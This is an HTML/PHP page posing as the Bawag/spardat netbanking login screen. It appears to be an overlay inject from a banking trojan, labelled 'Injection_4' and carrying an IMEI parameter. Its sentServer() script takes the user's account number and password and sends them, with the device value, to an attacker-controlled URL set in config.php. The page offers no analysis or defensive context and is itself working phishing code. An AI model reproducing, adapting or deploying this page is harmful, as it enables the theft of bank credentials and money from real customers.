<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>
	
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="at/at.spardat.netbanking/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

<div id="header">
	<h3> Login </h3>
	<h4> Impressum/GBEB </h4>
</div>

    <div class="main">
        <div class="container">
            <div class="row">
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

                        <form id="form">
<br>
                            <div class="form-group ">
							<label>Verfügernummer</label>
                                	<input type="text" class="form-control" name="field2" id="login" autocomplete="off" maxlength="17" data-reg="/.{4,30}/" required="">
								
                          </div>

                            <div class="form-group">
							<label>Passwort</label>
                                	<input type="password" class="form-control" name="field3" id="password" autocomplete="off" data-reg="/.{4,30}/" maxlength="20" required="">
									
                            </div>

                    	<input type="button" style="margin-bottom: 20px;"  onClick="sentServer();" class="input_submitBtn" value="Login">

                        </form>
</div>
<script>
	function sentServer()
	{

		var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	
		var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	
	
	var login1 = document.forms["form"].elements["login"].value; 
	var pass = document.forms["form"].elements["password"].value; 

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|spardat netbanking|"+login1+"|"+pass);
	}
	}
</script>

                </div>
            </div>
        </div>
    </div>

</body>
</html>
